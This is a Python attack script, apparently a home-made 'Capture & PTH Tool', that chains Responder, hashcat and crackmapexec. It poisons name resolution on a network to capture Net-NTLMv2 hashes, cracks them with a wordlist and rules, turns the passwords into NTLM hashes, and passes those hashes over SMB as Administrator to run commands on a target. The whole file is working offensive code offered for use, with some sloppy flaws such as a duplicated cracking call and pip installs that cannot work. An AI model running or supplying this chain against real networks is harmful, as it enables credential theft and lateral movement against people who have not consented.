######################################################################################################################################################################################################################
# Python script that installs required tools, checks for and attempts to install responder, hashcat, and crackmap, attemp[ts to hijack net-ntlm hashes off the network, correctly format the hashes gleened, using hashcat, gives a count of successfully recovered passwords, & converts them to NTLM.
# Bash: python3 capture_and_pass_hash.py. Ensure wordlist & rule file is accessible in the same folder, or specify the paths. Special thanks to StealthSploit for the robust rule file. https://github.com/stealthsploit/OneRuleToRuleThemStill
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################



import subprocess
import re
import sys
import os

def display_splash_screen():
    splash = """
    
    
_________                __                                            .___ ________________________ ___   ___________           .__                 _____ ______________  ___ ___    _____           _______  ____ 
\_   ___ \_____  _______/  |_ __ _________   ____   _____    ____    __| _/ \______   \__    ___/   |   \  \__    ___/___   ____ |  |               /  |  /_   \______   \/   |   \  /  |  |          \   _  \/_   |
/    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \  \__  \  /    \  / __ |   |     ___/ |    | /    ~    \   |    | /  _ \ /  _ \|  |     ______   /   |  ||   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
\     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/   / __ \|   |  \/ /_/ |   |    |     |    | \    Y    /   |    |(  <_> |  <_> )  |__  /_____/  /    ^   /   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 \______  (____  /   __/|__| |____/ |__|    \___  > (____  /___|  /\____ |   |____|     |____|  \___|_  /    |____| \____/ \____/|____/           \____   ||___||____|    \___|_  /\____   |           \_____  /___|
        \/     \/|__|                           \/       \/     \/      \/                            \/                                               |__|                     \/      |__|                 \/     
 
                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("Capture & PTH Tool 41PH4-01\n")

import subprocess
import re
import sys
import os
import hashlib

def is_tool_installed(tool_name):
    """Check if a tool is installed by running 'which' command."""
    result = subprocess.run(['which', tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def install_tools():
    tools = {
        "responder": "git+https://github.com/lgandx/Responder.git",
        "hashcat": "hashcat",
        "crackmapexec": "crackmapexec",
    }

    for tool, install_command in tools.items():
        if is_tool_installed(tool):
            print(f"[+] {tool} is already installed.")
        else:
            try:
                if tool == "responder":
                    subprocess.check_call([sys.executable, "-m", "pip", "install", install_command])
                else:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", install_command])
                print(f"[+] {tool} installed successfully.")
            except subprocess.CalledProcessError:
                print(f"[-] Failed to install {tool}.")
                sys.exit(1)

def capture_hashes():
    print("[+] Starting Responder to capture hashes...")
    responder_process = subprocess.Popen(['sudo', 'responder', '-I', 'eth0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return responder_process

def stop_responder(responder_process):
    print("[+] Stopping Responder...")
    responder_process.terminate()

def extract_hashes():
    print("[+] Extracting captured hashes from Responder logs...")
    hashes = []
    responder_log_path = '/usr/share/responder/logs/Responder-Session.log'
    if not os.path.exists(responder_log_path):
        print("[-] Responder log file not found.")
        return hashes

    with open(responder_log_path, 'r') as log_file:
        for line in log_file:
            if 'NTLMv2-SSP Hash' in line:
                hash_line = line.strip()
                ntlm_hash = re.search(r'(?<=NTLMv2-SSP Hash   : )(.*)', hash_line).group(0)
                hashes.append(ntlm_hash)
    return hashes

def crack_hash(net_ntlm_hash):
    print(f"[+] Cracking hash: {net_ntlm_hash}")
    # Save the hash to a file for hashcat
    hash_file = "netntlmv2.hash"
    with open(hash_file, "w") as file:
        file.write(net_ntlm_hash + "\n")

    # Run hashcat to crack the Net-NTLMv2 hash
    hashcat_command = [
        "hashcat",
        "-m", "5600",
        hash_file,
        "rockyou.txt",  # Specify the path to your wordlist
        "--rules-file", "one-rule-to-rule-them-all.rule",  # Specify the path to your rules file
        "--show"
    ]
    result = subprocess.run(hashcat_command, capture_output=True, text=True)
    cracked = result.stdout.strip().split(':')
    if len(cracked) > 2:
        password = cracked[2]
        return password
    else:
        return None

def get_ntlm_hash(password):
    ntlm_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
    return ntlm_hash

def run_crackmapexec(target, ntlm_hash):
    username = 'Administrator'  # Default username, replace as needed
    command = [
        "crackmapexec",
        "smb",
        target,
        "-u",
        username,
        "-H",
        ntlm_hash,
        "--exec-method",
        "smbexec"
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def main():
    # Install dependencies
    install_tools()

    # Start Responder to capture hashes
    responder_process = capture_hashes()

    # Let Responder run for a period to capture hashes
    try:
        input("Press Enter to stop Responder and process captured hashes...")
    except KeyboardInterrupt:
        pass

    # Stop Responder
    stop_responder(responder_process)

    # Extract captured hashes
    net_ntlm_hashes = extract_hashes()
    if not net_ntlm_hashes:
        print("[-] No hashes captured. Exiting.")
        return

    # Crack Net-NTLMv2 hashes to get NTLM hashes
    cracked_passwords = [crack_hash(hash) for hash in net_ntlm_hashes if crack_hash(hash)]
    cracked_count = len(cracked_passwords)
    print(f"[+] Number of passwords cracked: {cracked_count}")

    if cracked_count == 0:
        print("[-] Failed to crack any Net-NTLMv2 hashes.")
        return

    ntlm_hashes = [get_ntlm_hash(password) for password in cracked_passwords if password]

    # Run crackmapexec using captured NTLM hashes
    target = "TARGET_MACHINE_NAME"
    for ntlm_hash in ntlm_hashes:
        print(f"[+] Using NTLM hash: {ntlm_hash}")
        output = run_crackmapexec(target, ntlm_hash)
        if output:
            print("[+] Command output:")
            print(output)
        else:
            print("[-] Failed to execute command on target")

if __name__ == "__main__":
    main()
